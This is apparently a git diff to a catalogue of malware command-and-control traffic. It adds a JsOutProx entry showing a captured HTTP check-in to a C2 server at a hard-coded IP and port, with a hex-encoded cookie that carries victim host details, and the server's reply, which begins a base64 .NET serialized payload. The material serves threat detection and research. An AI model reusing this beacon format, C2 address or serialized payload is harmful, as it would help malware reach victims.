@@ -1123,6 +1123,28 @@ ibcvwj.push("wR6EREzW>CzEz54zRy361wRDt97y");
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jasperloader.png "JasperLoader")
 
+#### JsOutProx
+~~~
+POST / HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-Form-urlencoded; Charset=UTF-8
+Accept: */*
+Accept-Encoding: gzip, deflate
+Cookie: _uot=43344241333634375f7c5f38396139633066382d393535362d346339662d626363642d6330373464646331346230395f7c5f555345522d50435f7c5f61646d696e5f7c5f4d6963726f736f66742057696e646f777320372050726f66657373696f6e616c205f7c5f362e312e373630315f7c5f4a734f757450726f785f7c5f70696e67
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0
+Content-Length: 0
+Host: 91.189.180.199:9989
+
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Set-Cookie: _utl=73646e5f7c5f
+Content-Length: 20164
+Connection: close
+
+AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkDAAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/jsoutprox.png "JsOutProx")
+
 #### JSSLoader
 ~~~
 POST /gate.php?bot_id=JenniferPCJENNIFERPCVMware564db87746ebb934e9e0b94b413682b8 HTTP/1.1
